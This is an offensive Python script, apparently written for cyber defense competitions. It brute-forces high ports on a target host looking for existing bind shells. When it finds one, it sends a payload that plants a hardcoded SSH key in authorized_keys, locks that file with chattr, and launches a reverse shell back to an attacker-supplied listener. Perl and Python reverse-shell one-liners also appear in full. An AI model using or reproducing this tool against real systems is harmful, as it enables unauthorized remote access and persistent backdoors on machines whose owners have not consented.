'''
Many times in CDCs there are random bind shells on high ports.
This script will attempt to brute force which port the bind shell
is on and run a command if successful.
'''

import socket
import time
from multiprocessing import Pool
import optparse


def hunt_bind_shells(r_port):
    # create a new socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    pub_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk/cca0ZSYAkm6Y+XPQ6pXeELzDaByYYjHroTad9o7lIvatUmNoILIiGeyte4y/lvSiC/bqy4Gza64fBuARnPNNY+DSVCHYCNaGSfAUFXTevKhvkkx8t943zxwZgnx3yPfh4vuBRozqegMbT78ww9qI0ywo3eSYnYHV2aQCRNsKry4eQJMy+F0lcjy8SMA5GBbZbSWCi6z6aHJCLYPIQtQww4jlSkNs6Y6I3hMCunrs2iyg+2SE/2FUaC3NXfMDqYyq6MxMsWGmevMzg9ke8l1jSBUpx+9LLjSWrfWZSpzeRuojmDUXUFGzC5qs8+xb7grgqLFcotjEaawbUblsGfN"
    add_ssh_pub_key = "mkdir .ssh; touch .ssh/authorized_keys; echo " + pub_key + " >> .ssh/authorized_keys; chattr +i .ssh/authorized_keys"
    perl_reverse = "perl -e 'use Socket;$i=\"" + l_host + "\";$p=" + l_port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'"
    python3_reverse = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    python_reverse = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    # add a pub key & a reverse shell
    payload = add_ssh_pub_key + "; " + python3_reverse + "\n"
    # just a reverse shell
    #payload = perl_reverse + "\n"
    try:
        s.connect((r_host, r_port))
        print(green + "Winner {0} {1}".format(r_host, r_port) + end_color)
        print(blue + "Go get your Shellz! {0}:{1}".format(l_host, l_port) + end_color)
        s.send(payload.encode())
        data = s.recv(1024)
        print(data)
        s.close()
        exit()

    except socket.error as e:
        print(red + "{0} {1} ".format(r_host, r_port) + str(e) + end_color)


def pooled_hunt(t):
    # function to pool calling the hunt_bind_shells function
    # range - The range of ports to try
    with Pool(t) as p:
        p.map(hunt_bind_shells, range(40000, 65020))
    p.close()


if __name__ == '__main__':
    '''
    if len(sys.argv) != 3:
        print('Usage: python3 ' + sys.argv[0] + ' host threads')
        sys.exit(0)
    # Assign arguments to more meaningful variables
    #host = sys.argv[1]
    #threads = int(sys.argv[2])
    '''

    # Declare some colors to use
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end_color = '\033[0m'

    # Parse options
    parser = optparse.OptionParser()
    parser.add_option('-t', '--threads', dest='threads', help='Number of threads', type=int)
    parser.add_option('-r', '--rhost', dest='r_host', help='IP Address to scan')
    parser.add_option('-f', '--file', dest='file', help='Path to hosts file - Future functionality')
    parser.add_option('-l', '--lhost', dest='l_host', help='Listening IP address')
    parser.add_option('-p', '--lport', dest='l_port', help='Listening port')
    (options, args) = parser.parse_args()

    # assign better var names
    r_host = options.r_host
    thread = options.threads
    l_host = options.l_host
    l_port = options.l_port
    file = options.file

    print(yellow + "Did you setup a listener? {0}:{1}".format(l_host, l_port) + end_color)
    time.sleep(3)

    # quick check to ensure we have all options
    if r_host is None:
        if file is None:
            print(red + "Give me something to scan... -r or -f" + end_color)
            exit()
    if l_host is None:
        print(red + "Please specify an IP address for the reverse shell... -l" + end_color)
        exit()
    if l_port is None:
        print(red + "Please specify a port for the reverse shell... -p" + end_color)

    if thread is None:
        print(red + "Threads not specified.  Defaulting to 10" + end_color)
        threads = 10

    if r_host is not None:
        # If we have an r_host scan it
        pooled_hunt(thread)
        exit()

    if file is not None:
        # If we have a file, open it and scan it.
        try:
            f = open(file, 'r')
            for line in f:
                r_host = line.rstrip('\n')
                print(r_host)
                pooled_hunt(thread)
            f.close()

        except IOError as e:
            print(e)












